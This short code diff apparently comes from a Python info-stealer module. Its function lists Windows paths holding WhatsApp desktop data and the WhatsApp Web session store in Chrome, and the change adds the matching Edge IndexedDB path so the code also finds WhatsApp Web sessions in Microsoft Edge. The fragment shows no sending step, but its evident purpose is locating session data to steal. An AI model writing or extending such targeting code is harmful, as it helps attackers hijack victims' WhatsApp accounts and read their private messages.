@@ -37,7 +37,8 @@ def run(info):
         os.path.join(main_drive, "Users", username, "AppData", "Local", "WhatsApp"),
         os.path.join(main_drive, "Users", username, "AppData", "Local", "VirtualStore", "Program Files", "WhatsApp"),
         os.path.join(main_drive, "Users", username, "AppData", "Local", "VirtualStore", "Program Files (x86)", "WhatsApp"),
-        os.path.join(main_drive, "Users", username, "Appdata", "Local", "Google", "Chrome", "User Data", "Default", "IndexedDB", "https_web.whatsapp.com_0.indexeddb.leveldb")
+        os.path.join(main_drive, "Users", username, "Appdata", "Local", "Google", "Chrome", "User Data", "Default", "IndexedDB", "https_web.whatsapp.com_0.indexeddb.leveldb"),
+        os.path.join(main_drive, "Users", username, "Appdata", "Local", "Microsoft", "Edge", "User Data", "Default", "IndexedDB", "https_web.whatsapp.com_0.indexeddb.leveldb")
     )
     found_whatsapp_locations = []
 
